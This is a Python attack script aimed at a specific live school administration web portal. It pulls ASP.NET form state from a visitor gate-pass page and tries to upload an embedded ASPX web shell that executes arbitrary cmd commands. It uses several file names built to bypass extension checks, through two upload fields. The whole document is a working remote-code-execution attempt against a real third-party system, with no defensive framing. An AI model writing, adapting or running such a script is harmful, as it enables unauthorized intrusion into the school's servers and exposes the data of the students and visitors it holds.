import requests
import re
import html

session = requests.Session()
gatepass_url = "https://econnectapp.jupsoft.com/StudentAdministration/Erp_VisitorGatePassNew.aspx?id=+ub90+AGTvY="

# Step 1: GET the page and extract ViewState
r = session.get(gatepass_url)
content = r.text

# Extract ONLY the fields that exist
vs_match = re.search(r'__VIEWSTATE" value="([^"]+)"', content)
vs = html.unescape(vs_match.group(1)) if vs_match else ""
print(f"__VIEWSTATE found: {len(vs)} chars")

vsg_match = re.search(r'__VIEWSTATEGENERATOR" value="([^"]+)"', content)
vsg = html.unescape(vsg_match.group(1)) if vsg_match else ""
print(f"__VIEWSTATEGENERATOR: {vsg}")

# Check if EVENTVALIDATION exists
ev_match = re.search(r'__EVENTVALIDATION" value="([^"]+)"', content)
if ev_match:
    print(f"__EVENTVALIDATION found: {len(ev_match.group(1))} chars")
else:
    print("__EVENTVALIDATION: NOT PRESENT on this page")

# ASPX webshell
shell = '<%@ Page Language="C#" Debug="true" %><%@ Import Namespace="System.Diagnostics" %><script runat="server">void Page_Load(object s2, EventArgs e){if(Request["cmd"]!=null){Process p=new Process();p.StartInfo.FileName="cmd";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());}}</script>'

# The actual upload field names from the HTML
photo_field = "ctl00$ContentPlaceHolder1$fileuploadVisitor"
doc_field = "ctl00$ContentPlaceHolder1$flupload"

# Test filenames to try bypassing extension validation
filenames = [
    "shell.aspx",           # direct
    "shell.aspx.png",       # double ext
    "shell.ashx",           # ASHX handler
    "shell.asmx",           # ASMX web service
]

print("\n--- Trying uploads ---")
for fname in filenames:
    data = {
        "__VIEWSTATE": vs,
        "__VIEWSTATEGENERATOR": vsg,
        "ctl00$ContentPlaceHolder1$btnSave": "Save",
        "ctl00$ContentPlaceHolder1$txtVisitorName": "Test",
        "ctl00$ContentPlaceHolder1$txtMobileNo": "9999999999",
        "ctl00$ContentPlaceHolder1$txtDate": "11/07/2026",
        "ctl00$ContentPlaceHolder1$txtPurposeofVisit": "Test purpose",
        "ctl00$ContentPlaceHolder1$ddlVisitorType": "Outsider Parent",
        "ctl00$ContentPlaceHolder1$txtNoOfPerson": "1",
    }
    
    r2 = session.post(
        gatepass_url,
        files={doc_field: (fname, shell, "application/octet-stream")},
        data=data,
        allow_redirects=True
    )
    
    resp_len = len(r2.text)
    
    # Check if form was actually processed
    if "Successfully" in r2.text:
        print(f"[!!!] FORM SUBMITTED - {fname} (len: {resp_len})")
    elif resp_len < 5000:
        print(f"[???] Short response - {fname} (len: {resp_len})")
        print(r2.text[:300])
    else:
        print(f"[-] Same page reload - {fname} (len: {resp_len})")

# Also try uploading via the photo field
print("\n--- Trying photo field (should be more restrictive) ---")
for fname in ["shell.aspx", "shell.aspx.jpg"]:
    r2 = session.post(
        gatepass_url,
        files={photo_field: (fname, shell, "application/octet-stream")},
        data={
            "__VIEWSTATE": vs,
            "__VIEWSTATEGENERATOR": vsg,
            "ctl00$ContentPlaceHolder1$btnSave": "Save",
        },
        allow_redirects=True
    )
    
    if "Successfully" in r2.text:
        print(f"[!!!] PHOTO UPLOAD SUCCESS - {fname}")
    else:
        print(f"[-] Failed - {fname} (len: {len(r2.text)})")
